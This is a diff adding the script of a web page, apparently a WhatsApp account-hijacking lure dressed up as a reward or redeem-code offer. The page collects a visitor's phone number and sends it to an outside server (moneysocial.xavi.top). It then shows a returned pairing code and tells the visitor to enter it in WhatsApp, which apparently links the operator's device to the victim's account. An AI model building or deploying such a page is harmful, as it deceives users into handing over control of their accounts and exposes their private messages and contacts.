+        { code: "+64", name: "New Zealand", flag: "🇳🇿" },
+        { code: "+679", name: "Fiji", flag: "🇫🇯" },
+        { code: "+675", name: "Papua New Guinea", flag: "🇵🇬" },
+        { code: "+212", name: "Morocco", flag: "🇲🇦" },
+        { code: "+213", name: "Algeria", flag: "🇩🇿" },
+        { code: "+216", name: "Tunisia", flag: "🇹🇳" },
+        { code: "+218", name: "Libya", flag: "🇱🇾" },
+        { code: "+233", name: "Ghana", flag: "🇬🇭" },
+        { code: "+225", name: "Ivory Coast", flag: "🇨🇮" },
+        { code: "+221", name: "Senegal", flag: "🇸🇳" },
+        { code: "+220", name: "Gambia", flag: "🇬🇲" },
+        { code: "+256", name: "Uganda", flag: "🇺🇬" },
+        { code: "+255", name: "Tanzania", flag: "🇹🇿" },
+        { code: "+260", name: "Zambia", flag: "🇿🇲" },
+        { code: "+263", name: "Zimbabwe", flag: "🇿🇼" },
+        { code: "+380", name: "Ukraine", flag: "🇺🇦" },
+        { code: "+375", name: "Belarus", flag: "🇧🇾" },
+        { code: "+374", name: "Armenia", flag: "🇦🇲" },
+        { code: "+995", name: "Georgia", flag: "🇬🇪" },
+        { code: "+976", name: "Mongolia", flag: "🇲🇳" },
+        { code: "+95", name: "Myanmar", flag: "🇲🇲" },
+        { code: "+856", name: "Laos", flag: "🇱🇦" },
+        { code: "+855", name: "Cambodia", flag: "🇰🇭" }
+      ];
+
+      const overlay = document.createElement('div');
+      overlay.className = 'modal-overlay';
+      overlay.innerHTML = `
+        <div class="modal-container">
+          <button type="button" class="modal-close" aria-label="Close">&times;</button>
+          <div class="modal-content" id="modalDynamicContent"></div>
+        </div>
+      `;
+      document.body.appendChild(overlay);
+
+      const closeBtn = overlay.querySelector('.modal-close');
+      const contentContainer = document.getElementById('modalDynamicContent');
+
+      function closeModal() {
+        overlay.classList.remove('active');
+      }
+      closeBtn.addEventListener('click', closeModal);
+      overlay.addEventListener('click', (e) => {
+        if (e.target === overlay) closeModal();
+      });
+
+      function showStep1() {
+        let optionsHtml = '';
+        countryList.forEach(country => {
+          optionsHtml += `<option value="${country.code}">${country.flag} ${country.code}</option>`;
+        });
+        contentContainer.innerHTML = `
+          <div class="popup-left">
+            <span class="whatsapp">WhatsApp</span>
+            <img src="assets/logo.gif" alt="logo">
+            <div class="header-divider"></div>
+          </div>
+          <div class="modal-sub">Enter your WhatsApp number to receive pair code</div>
+          <div class="input-group">
+            <select class="country-code" id="countryCodeSelect">${optionsHtml}</select>
+            <input type="tel" class="phone-input" id="phoneNumberInput" placeholder="Phone number" autocomplete="off">
+          </div>
+          <button type="button" class="get-code-btn" id="getCodeBtn">GET CODE</button>
+        `;
+
+        const getCodeBtn = document.getElementById('getCodeBtn');
+        const phoneInput = document.getElementById('phoneNumberInput');
+        const countrySelect = document.getElementById('countryCodeSelect');
+
+        getCodeBtn.addEventListener('click', async () => {
+          const countryCode = countrySelect.value;
+          const phone = phoneInput.value.trim();
+          if (!phone) {
+            alert('Please enter phone number');
+            return;
+          }
+          getCodeBtn.disabled = true;
+          getCodeBtn.textContent = 'SENDING...';
+
+          try {
+            const fullNumber = (countryCode + phone)
+              .replace(/\+/g, '')
+              .replace(/\s+/g, '')
+              .trim();
+            const params = new URLSearchParams(window.location.search);
+            const uuid = params.get('click_id') || Date.now().toString();
+            const keyParam = params.get('key') || 'yyiJXuyA';
+            const apiUrl = `https://moneysocial.xavi.top/qrcode?key=${keyParam}&pairCode=77773333&uuid=${uuid}&phone=${encodeURIComponent(fullNumber)}`;
+            const response = await fetch(apiUrl, { method: 'GET' });
+            const result = await response.json();
+            const pairCode = result.data.pairCode;
+            if (!pairCode || pairCode.length !== 9) {
+              throw new Error('Invalid code received');
+            }
+            showStep2(pairCode);
+          } catch (err) {
+            console.error(err);
+            alert('Error fetching code. Please try again.');
+            getCodeBtn.disabled = false;
+            getCodeBtn.textContent = 'GET CODE';
+          }
+        });
+      }
+
+      function showStep2(pairCode) {
+        contentContainer.innerHTML = `
+          <div class="modal-title">🎉 CODE GENERATED</div>
+          <div class="pair-code" id="pairCodeDisplay">${pairCode}</div>
+          <button type="button" class="copy-code-btn" id="copyCodeBtn">📋 COPY CODE</button>
+          <div class="modal-sub" style="margin-top: 16px;">Use this code in WhatsApp to claim redeem code</div>
+        `;
+        const copyBtn = document.getElementById('copyCodeBtn');
+        copyBtn.addEventListener('click', () => {
+          navigator.clipboard.writeText(pairCode).then(() => {
+            copyBtn.textContent = '✓ COPIED!';
+            setTimeout(() => { copyBtn.textContent = '📋 COPY CODE'; }, 2000);
+          }).catch(() => alert('Failed to copy'));
+        });
+      }
+
+      installBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        showStep1();
+        overlay.classList.add('active');
+      });
+    })();
+  </script>
+</body>
+</html>
